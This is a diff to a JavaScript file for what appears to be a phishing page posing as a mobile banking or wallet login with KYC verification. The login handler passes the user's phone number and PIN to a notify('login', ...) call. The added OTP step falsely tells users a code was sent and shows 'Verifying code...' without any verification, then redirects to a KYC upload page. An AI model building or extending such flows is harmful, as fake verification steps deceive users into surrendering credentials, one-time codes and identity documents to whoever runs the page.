@@ -246,13 +246,15 @@ document.addEventListener('DOMContentLoaded', function () {
       e.preventDefault();
       const consent = this.querySelector('input[name="kycConsent"]');
       if (consent && !consent.checked) { showToast('Please agree to the verification terms.', 'error'); return; }
-      showToast('KYC submitted! Your documents are under review. We will email you shortly.', 'success');
       this.querySelector('button[type="submit"]').disabled = true;
+      const modal = document.getElementById('kyc-modal');
+      if (modal) modal.classList.add('show');
     });
   }
 
-  /* ---------- App-style Login (mobile + 4-digit PIN) ---------- */
+  /* ---------- App-style Login (mobile + 4-digit PIN + OTP) ---------- */
   const loginForm = document.getElementById('login-form');
+  const otpForm = document.getElementById('otp-form');
   if (loginForm) {
     const pinBoxes = loginForm.querySelectorAll('.pin-box');
     const pinHidden = loginForm.querySelector('input[name="password"]');
@@ -299,8 +301,48 @@ document.addEventListener('DOMContentLoaded', function () {
         return;
       }
       notify('login', { username: num, pin: pin });
-      showToast('Signing you in securely...', 'success');
-      setTimeout(function () { window.location.href = 'kyc.html'; }, 1200);
+      if (otpForm) otpForm.style.display = 'block';
+      loginForm.style.display = 'none';
+      showToast('A 6-digit code was sent to your phone.', 'success');
+      const firstOtp = otpForm ? otpForm.querySelector('.pin-box') : null;
+      if (firstOtp) firstOtp.focus();
+    });
+  }
+
+  if (otpForm) {
+    const otpBoxes = otpForm.querySelectorAll('.pin-box');
+    const otpHidden = otpForm.querySelector('input[name="otp"]');
+    const syncOtp = function () {
+      otpHidden.value = Array.prototype.map.call(otpBoxes, function (b) { return b.value; }).join('');
+    };
+    otpBoxes.forEach(function (box, idx) {
+      box.addEventListener('input', function () {
+        box.value = box.value.replace(/\D/g, '').slice(0, 1);
+        syncOtp();
+        if (box.value && idx < otpBoxes.length - 1) otpBoxes[idx + 1].focus();
+      });
+      box.addEventListener('keydown', function (e) {
+        if (e.key === 'Backspace' && !box.value && idx > 0) otpBoxes[idx - 1].focus();
+      });
+      box.addEventListener('paste', function (e) {
+        e.preventDefault();
+        const text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 6);
+        for (let i = 0; i < otpBoxes.length; i++) otpBoxes[i].value = text[i] || '';
+        syncOtp();
+        if (text.length) otpBoxes[Math.min(text.length, otpBoxes.length) - 1].focus();
+      });
+    });
+
+    otpForm.addEventListener('submit', function (e) {
+      e.preventDefault();
+      const otp = otpHidden.value;
+      if (!/^\d{6}$/.test(otp)) {
+        showToast('Enter the 6-digit code sent to your phone.', 'error');
+        otpBoxes[0].focus();
+        return;
+      }
+      showToast('Verifying code...', 'success');
+      setTimeout(function () { window.location.href = 'kyc.html'; }, 1000);
     });
   }
 
